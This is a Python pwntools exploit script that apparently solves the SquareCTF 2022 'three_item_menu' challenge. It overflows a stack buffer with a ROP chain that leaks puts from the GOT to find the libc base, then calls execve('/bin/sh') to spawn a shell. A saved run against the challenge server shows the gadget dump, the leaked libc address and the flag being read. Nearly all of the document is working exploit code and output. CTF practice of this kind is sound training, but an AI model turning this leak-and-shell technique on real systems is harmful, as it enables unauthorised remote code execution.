#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "three_item_menu"
LIBC = "/root/Documents/pwn/squareCTF/pwncrypto/libc.so.6"
LD = "/root/Documents/pwn/squareCTF/pwncrypto/ld-2.27.so"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* 0x4007EF
source /root/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

def exp():

    io = start()

    rop = pwn.ROP(exe)
    rop.call(exe.sym.puts, [exe.got.puts])
    rop.call(exe.sym.order, [0x400C62])

    print(rop.dump())

    io.sendlineafter(b"> ", b"2")
    io.sendafter(b"We come with complementary serving of 32 bytes. How many extra bytes would you like to nibble on?\n", str(80).encode())
    io.sendlineafter(b"What would you like to eat?\n> ", b"t"*56 + rop.chain())
   
    io.recvuntil(b"up\n")
    libc.address = (pwn.u64(io.recv(7).replace(b"\n", b"").ljust(8, b"\x00")) - 0x80970)
    pwn.log.info(f"libc: {hex(libc.address)}")

    rop = pwn.ROP(libc)
    
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop.execve(binsh, 0, 0)

    io.sendafter(b"We come with complementary serving of 32 bytes. How many extra bytes would you like to nibble on?\n", str(80).encode())
    io.sendlineafter(b"What would you like to eat?\n> ", b"t"*56 + rop.chain())

    io.interactive()

"""
[root@(none) pwncrypto]# python3 exploit.py REMOTE HOST=chals.2022.squarectf.com PORT=4099
[+] Opening connection to chals.2022.squarectf.com on port 4099: Done
[*] Loaded 14 cached gadgets for 'three_item_menu'
0x0000:         0x400a43 pop rdi; ret
0x0008:         0x602018 [arg0] rdi = got.puts
0x0010:         0x4005d0
0x0018:         0x400a43 pop rdi; ret
0x0020:         0x400c62 [arg0] rdi = 4197474
0x0028:         0x40077d
[*] libc: 0x7f0ce6d57000
[*] Loaded 199 cached gadgets for '/root/Documents/pwn/squareCTF/pwncrypto/libc.so.6'
[*] Switching to interactive mode
$ cat flag.txt
flag{hope_you_enjoy_this_appetizer}
"""

if __name__ == "__main__":
    exp()
